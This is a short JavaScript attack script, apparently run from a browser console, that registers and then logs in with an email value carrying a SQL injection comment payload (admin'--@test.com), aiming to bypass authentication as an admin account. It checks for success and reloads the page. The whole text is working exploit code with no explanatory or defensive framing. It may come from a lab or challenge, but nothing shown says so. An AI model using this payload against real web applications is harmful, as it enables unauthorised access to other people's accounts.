// Step 1: Register the account (you already did this)
fetch('/register', {
  method: 'POST',
  headers: {'Content-Type': 'application/x-www-form-urlencoded'},
  body: 'email=admin\'--@test.com&password=Password123!&remember=on'
}).then(r => r.text()).then(html => {
  console.log('Registration response:', html.substring(0, 300));
});

// Step 2: Now login with the same credentials
fetch('/login', {
  method: 'POST',
  headers: {'Content-Type': 'application/x-www-form-urlencoded'},
  body: 'email=admin\'--@test.com&password=Password123!&remember=on'
}).then(r => {
  console.log('Login status:', r.status);
  console.log('Login redirected:', r.redirected);
  return r.text();
}).then(html => {
  console.log('Login successful?', !html.includes('type="email"'));
  if (!html.includes('type="email"')) {
    console.log('SUCCESS - Logged in!');
    window.location.reload(); // Reload to see profile
  }
});